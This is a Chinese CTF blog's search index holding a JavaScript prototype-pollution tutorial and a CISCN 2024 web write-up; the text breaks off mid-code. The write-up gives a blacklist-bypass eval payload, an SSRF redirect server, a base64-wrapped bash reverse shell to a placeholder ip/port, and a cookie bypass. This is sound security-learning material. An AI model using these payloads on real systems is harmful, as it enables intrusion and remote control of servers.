<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JS原型链污染</title>
      <link href="/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/"/>
      <url>/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="什么是js原型-prototype"><a href="#什么是js原型-prototype" class="headerlink" title="什么是js原型(prototype)"></a>什么是js原型(prototype)</h2><p>要弄清这个问题，就要先弄清什么事类和对象。<br>类和对象是面向对象的编程语言中的几本概念。这里不进行详细阐述，简单的说，类可以实例化成为对象。二者内部都存在属性和方法。</p><p>现在来说原型。原型分为显式原型(prototype)和隐式原型(_<em>proto_</em>)。现在假定有一个类Foo和一个Foo类实例化得出的对象foo。我们可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">FunctionName</span> = </span><br></pre></td></tr></table></figure><p>来定义原型。完成了定义后，就可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="title class_">FunctionName</span>();</span><br></pre></td></tr></table></figure><p>来对定义好的函数来进行调用了。</p><p>而__proto__和prototype的关系为：foo.__proto__ &#x3D;&#x3D; Foo.prototype</p><p>总的来说，prototype是类的一个属性，而由该类实例化得到的对象都会拥有prototype的属性和方法。</p><h2 id="什么是js原型链"><a href="#什么是js原型链" class="headerlink" title="什么是js原型链"></a>什么是js原型链</h2><p><img src="/images/yxl.png" alt="img1"></p><p>这张图中可以看到，通过 __proto__ 可以一直往前找对象的原型，就形成了原型链。</p><p>而js在寻找属性时，如果在当前的对象中找不到，则会去对象的 __proto__ 中寻找。这个寻找机制就是原型继承链。</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>前文中已经提到，我们可以通过对象的 __proto__ 来访问类的原型。那么如果我门修改一个类的对象的 __proto__ ，是否就可以控制该类的其他对象的属性了呢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;bar : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"><span class="comment">//通过__proto__来修改属性bar的值</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>);</span><br></pre></td></tr></table></figure><p>运行这段代码可以发现，虽然zoo为一个空属性，但是输出其bar属性会发现结果为2。这就意味着我们通过一个对象来修改原型链，从而影响了其他的对象的属性。这就是js原型链污染的基本原理。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h3 id="1-merge-x2F-copy函数"><a href="#1-merge-x2F-copy函数" class="headerlink" title="1.merge&#x2F;copy函数"></a>1.merge&#x2F;copy函数</h3><p>merge函数合并两个对象时，对于属性的值时对象或者数组的，merge会把他们的引用复制给目标对象。因此，在merge完成后，修改源对象的属性，目标对象的属性也会发生变化。</p><p>这里用ctfshow的题目做例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这是题目登陆界面的源码，可以看到，这里把req.body也就是用户的请求内容copy到了user中，进行登陆。但是利用刚才的知识，如果传入一个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__proto__&quot;</span> : &#123;</span><br><span class="line"><span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以做到就该secret的对象的效果，从而得到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/08/26/test/"/>
      <url>/2024/08/26/test/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> gcd(a,b)</span><br><span class="line">    <span class="keyword">if</span> a == b</span><br><span class="line">       <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span> a &lt; b</span><br><span class="line">       <span class="keyword">return</span> gcd(b - a, a)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">return</span> gcd(a - b, b)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/07/31/test/"/>
      <url>/2024/07/31/test/</url>
      
        <content type="html"><![CDATA[let foo = {bar : 1};console.log(foo.bar);foo.__proto__.bar = 2;let zoo = {};console.log(zoo.bar);]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/07/30/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/07/30/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><h2 id="什么是js原型-prototype"><a href="#什么是js原型-prototype" class="headerlink" title="什么是js原型(prototype)"></a>什么是js原型(prototype)</h2><p>要弄清这个问题，就要先弄清什么事类和对象。<br>类和对象是面向对象的编程语言中的几本概念。这里不进行详细阐述，简单的说，类可以实例化成为对象。二者内部都存在属性和方法。</p><p>现在来说原型。原型分为显式原型(prototype)和隐式原型(_<em>proto_</em>)。现在假定有一个类Foo和一个Foo类实例化得出的对象foo。我们可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">FunctionName</span> = </span><br></pre></td></tr></table></figure><p>来定义原型。完成了定义后，就可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="title class_">FunctionName</span>();</span><br></pre></td></tr></table></figure><p>来对定义好的函数来进行调用了。</p><p>而__proto__和prototype的关系为：foo.__proto__ &#x3D;&#x3D; Foo.prototype</p><p>总的来说，prototype是类的一个属性，而由该类实例化得到的对象都会拥有prototype的属性和方法。</p><h2 id="什么是js原型链"><a href="#什么是js原型链" class="headerlink" title="什么是js原型链"></a>什么是js原型链</h2><p><img src="/images/yxl.png" alt="img1"></p><p>这张图中可以看到，通过 __proto__ 可以一直往前找对象的原型，就形成了原型链。</p><p>而js在寻找属性时，如果在当前的对象中找不到，则会去对象的 __proto__ 中寻找。这个寻找机制就是原型继承链。</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>前文中已经提到，我们可以通过对象的 __proto__ 来访问类的原型。那么如果我门修改一个类的对象的 __proto__ ，是否就可以控制该类的其他对象的属性了呢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;bar : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"><span class="comment">//通过__proto__来修改属性bar的值</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>);</span><br></pre></td></tr></table></figure><p>运行这段代码可以发现，虽然zoo为一个空属性，但是输出其bar属性会发现结果为2。这就意味着我们通过一个对象来修改原型链，从而影响了其他的对象的属性。这就是js原型链污染的基本原理。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些知识点</title>
      <link href="/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="一些乱七八糟的知识点"><a href="#一些乱七八糟的知识点" class="headerlink" title="一些乱七八糟的知识点"></a>一些乱七八糟的知识点</h1><h2 id="md5-str-true-漏洞"><a href="#md5-str-true-漏洞" class="headerlink" title="md5(str,true)漏洞"></a>md5(str,true)漏洞</h2><h2 id="print-r-global-“-”-遍历目录"><a href="#print-r-global-“-”-遍历目录" class="headerlink" title="print_r(global(“*”))遍历目录"></a>print_r(global(“*”))遍历目录</h2><h2 id="js大小写特性"><a href="#js大小写特性" class="headerlink" title="js大小写特性"></a>js大小写特性</h2><p>字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”</p><p>字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 ciscn 华北赛区初赛试题复现</title>
      <link href="/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2024CISCN-web方向题目复现与知识点梳理"><a href="#2024CISCN-web方向题目复现与知识点梳理" class="headerlink" title="2024CISCN web方向题目复现与知识点梳理"></a>2024CISCN web方向题目复现与知识点梳理</h1><h2 id="1-simple-php"><a href="#1-simple-php" class="headerlink" title="1.simple_php"></a>1.simple_php</h2><p>非常狗的一道题<br>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过post方式传入cmd参数与题目环境交互。<br>传入的cmd被套了一层<strong>escapeshellcmd</strong>函数后赋值给cmd，接着进行一个黑名单过滤。非常全面的一个黑名单…几乎把所有能用的都过滤掉了。最后执行cmd的命令。</p><hr><p>很简单的代码逻辑，难处在于如何绕过这两次过滤。<br>先来看第一层过滤：escapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>传入一个字符串参数，返回一个字符串参数。这是一个php自带的防止命令注入的函数，php文档对其的解释如下：</p><blockquote><p>“反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。”</p></blockquote><p>这也就导致这题难以通过特殊符号相关的方法来绕过黑名单，比如亦或的无符号rce等待。</p><p>下面的正则匹配就比较简单了。就是屏蔽了一些关键字。目前笔者发现还能用的命令有: man,diff,php,rev,paste,dd if&#x3D;</p><p>其中除了php以外都只能读取文件，diff命令比较好用的一点-r是他可以比较子目录中的文件。不过比较一番也没有找到。只能试着用php命令去连接数据可试试了。这里给出php命令的解释和使用方式。</p><pre><code>&gt;-r 执行代码，无需脚本标记 &gt;-f 执行文件</code></pre><p>个人感觉比较常用的以上两个选项。这里可以用php -r来执行代码。<br>测试php -r phpinfo();发现可以跑通</p><p><img src="/images/img_simphp.png" alt="img1"></p><p>但是如果使用system执行系统命令，还是会被上面的黑名单过滤，(甚至连引号都过滤掉了)因此使用hex2bin函数来进行绕过。hex2bin可以把输入的十六进制ascii码转换为字符串。这里先给出payload再做解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_hex,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>eval就不做解释了。这里主要解释为什么hex2bin里面要套一个substr。substr()函数输入三个参数：string,start,length。分别是待处理的字符串，开始位置，截取长度。第三个参数可以缺省，即输出从开始位置到结束的所有字符串。</p><p>这里调用这个函数的主要目的是：在没有但双引号的情况下，构造字符串。因为hex2bin的输入要求是引号包裹的字符串，但这里把引号ban了，就要用到substr了。substr允许输入没有引号包裹的字符串，并且输出一个字符串。这也就是说我们可以借用substr来实现无引号字符串的构建。测试一下whoami，发现正常回显，呢么接下来就是无聊的查库时间了。</p><p><img src="/images/simphp_test.png" alt="img1"></p><p>这个地方没啥技术含量，直接给出最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>这个题真是必须要看到hint才知道怎么做，hint提示flag.php的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方 REMOTE_ADDR 是没办法通过文件头伪造的。那就只能试一试ssrf了。</p><p>这道题ssrf的思路是这样：通过一个借口来访问一个恶意服务器，恶意服务器302将请求跳转到访问者本地的flag.php来通过 REMOTE_ADDR 的检测。</p><p>github上找一下源码，审计一下（其实这里有已经纰漏的漏洞，但是当时没找到，只能审了）搜了一下ssrf出发漏洞的常见函数，里面有一个file_get_contents()。找一下这个函数参数可控的地方。找到了如下代码：</p><p><img src="/images/dr.png" alt="img3"></p><p>继续寻找这个函数参数可控的地方：</p><p><img src="/images/qrcode.png" alt="img4"></p><p>这个地方的url是get方法传入的，很有戏。继续找，最终找到了这个地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_qrcode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$thumb</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$level</span> = <span class="string">&#x27;H&#x27;</span>, <span class="variable">$size</span> = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ROOT_URL.<span class="string">&#x27;index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$thumb</span>).<span class="string">&#x27;&amp;text=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$text</span>).<span class="string">&#x27;&amp;size=&#x27;</span>.<span class="variable">$size</span>.<span class="string">&#x27;&amp;level=&#x27;</span>.<span class="variable">$level</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么理论上讲访问这个url，控制下thumb的值就可以访问到咱们的恶意服务器了。在服务器上部署一个302跳转站，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,request,send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd= <span class="string">&quot;cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://127.0.0.1/flag.php?cmd=&quot;</span>+cmd)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>不熟之后本地访问一下，跳转到flag.php就说明已经成功部署了。这也就不难理解为什么这个服务可以通过flag.php的检测了。由于没有回显，需要弹一下shell。</p><p>这里用到弹shell的姿势如下：</p><blockquote><p>quote(“bash -c ‘{echo,base64_str}|{base64,-d}|{bash,-i}’”)</p></blockquote><p>其中，base64_str加密的内容如下：</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p></blockquote><p>接着按照上面的url访问&#x2F;index.php?s&#x3D;api&amp;c&#x3D;api&amp;m&#x3D;qrcode&amp;thumb&#x3D;<a href="http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1即可">http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1即可</a></p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="comment">#将user赋值为cookie中的user</span></span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line">    <span class="comment">#如果user为&#x27;adm;n&#x27;就把session中的admin项赋值为true</span></span><br><span class="line">    <span class="comment">#但问题是，cookie中的分号会被视为两个值之间的分割</span></span><br><span class="line">    <span class="comment">#这是第一个要解决的问题</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"><span class="comment">#成功登陆后可以污染这里的file文件来达到任意文件读取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一个问题比较好解决，翻阅github中sanic的源码可以发现，在处理cookie部分，<strong>sanic会将cookie中的八进制进行解码</strong>，根据这一特性，将cookie赋值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=adm\073n</span><br></pre></td></tr></table></figure><p>即可</p><p>下一个问题是python原型链污染的问题，这里准确的说是一个pydash的原型链污染问题。源代码中的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 